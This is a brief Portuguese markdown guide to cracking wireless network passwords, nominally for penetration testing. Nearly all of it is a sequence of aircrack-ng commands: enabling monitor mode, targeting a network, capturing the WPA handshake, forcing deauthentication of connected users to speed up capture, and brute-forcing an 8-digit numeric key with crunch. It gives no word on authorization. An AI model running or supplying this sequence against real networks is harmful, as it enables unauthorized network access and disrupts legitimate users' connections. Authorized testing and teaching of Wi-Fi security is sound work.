# Hackeando redes wireless de forma simples
## Para pentest em redes wireless







Iniciando placa em modo monitor
```bash
sudo airmon-ng start [NOME DA PLACA DE REDE]
```

Verificando redes por perto
```bash
sudo airodump-ng [NOME DA PLACA DE REDE]
```

Verificando a rede especifica
```bash
sudo airodump-ng --bssid [BSSID DA REDE] -c [CANAL DO SINAL] [PLACA DE REDE]
```

Para salvar o handshake em um arquivo basta passar o parametro abaixo no final
```bash
-w log.txt
```

Pode ser demorado D+ esperar alguem logar para capturar o handshake, sendo assim forçaremos a desautenticação dos usuários
```bash
sudo aireplay-ng --deauth 30 -a [BSSID DA REDE] [PLACA DE REDE]
```

Quebrando a senha com o crunch
```bash
crunch 8 8 0123456789 | aircrack-ng [ARQUIVO.cap] -b [BSSID DA REDE] -w-
```
